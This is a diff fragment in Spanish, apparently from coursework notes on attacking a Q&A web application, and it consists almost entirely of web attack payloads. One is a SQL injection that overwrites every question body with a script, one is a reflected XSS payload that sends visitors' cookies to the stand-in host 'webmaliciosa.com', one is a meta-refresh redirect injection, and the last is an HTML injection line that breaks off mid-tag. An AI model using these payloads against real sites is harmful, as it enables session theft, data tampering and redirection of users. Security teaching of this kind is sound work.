@@ -17,3 +17,12 @@ XSS Persistente embebido en un SQL Inyection. Usando la vulnerabilidad anterior 
 		body','l'); UPDATE questions SET body = "<script>alert('Hacked')</script>";--
 		Este código modifica el campo body de la pregunta de ana con un código javascript que muestra un mensaje al 
 		abrir dicha pregunta.
+
+XSS Reflejada	'--</h2><script>var x=document.createElement("IMG");x.src="http://www.webmaliciosa.com/cookies?cookies="+escape(document.cookie);x.height=50;x.width=50;x.id="hack";document.body.appendChild(x);</script><h2>
+		'--</h2><meta http-equiv=“refresh” content=“3;url=http://www.google.com”/><h2>
+
+
+
+
+
+		3;"><br><img src="http://arcdn02.mundotkm.com/2015/08/comida-basura-patatas-fritas-hamburguesa.jpg"/></br><input type="hidden
